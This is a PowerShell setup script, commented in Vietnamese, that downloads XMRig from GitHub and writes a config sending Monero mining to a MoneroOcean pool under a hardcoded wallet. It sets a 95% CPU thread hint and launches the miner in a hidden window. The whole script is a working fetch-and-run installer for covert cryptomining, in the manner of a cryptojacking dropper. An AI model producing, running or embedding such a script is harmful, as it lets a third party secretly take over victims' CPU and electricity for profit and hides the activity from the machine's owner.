$WALLET="44JxbUEsYccFWHku1bAij8Gqc69kUtjUB97d2wwKitPrZFbLvjMA7rg8hFPRRfZFpF5EQYgiSHYU5LTn2atSGu4tNU8GEC1"
$POOL="gulf.moneroocean.stream:10128"

Write-Host "===== SETUP XMRIG WINDOWS ====="

# tạo thư mục
New-Item -ItemType Directory -Force -Path "$env:USERPROFILE\xmrig" | Out-Null
cd "$env:USERPROFILE\xmrig"

# tải xmrig
Write-Host "Downloading xmrig..."
Invoke-WebRequest https://github.com/xmrig/xmrig/releases/latest/download/xmrig-6.22.0-msvc-win64.zip -OutFile xmrig.zip

# giải nén
Write-Host "Extracting..."
Expand-Archive xmrig.zip -DestinationPath . -Force

# tìm thư mục xmrig
$dir = Get-ChildItem -Directory | Where-Object {$_.Name -like "xmrig*"} | Select-Object -First 1
cd $dir.FullName

# tạo config
Write-Host "Creating config..."

@"
{
  "autosave": true,
  "cpu": {
    "enabled": true,
    "max-threads-hint": 95
  },
  "pools": [
    {
      "algo": "rx/0",
      "coin": "monero",
      "url": "$POOL",
      "user": "$WALLET",
      "pass": "win",
      "keepalive": true
    }
  ]
}
"@ | Out-File config.json -Encoding ASCII

# chạy miner background
Write-Host "Starting miner..."
Start-Process -WindowStyle Hidden -FilePath ".\xmrig.exe"

Write-Host "DONE!"
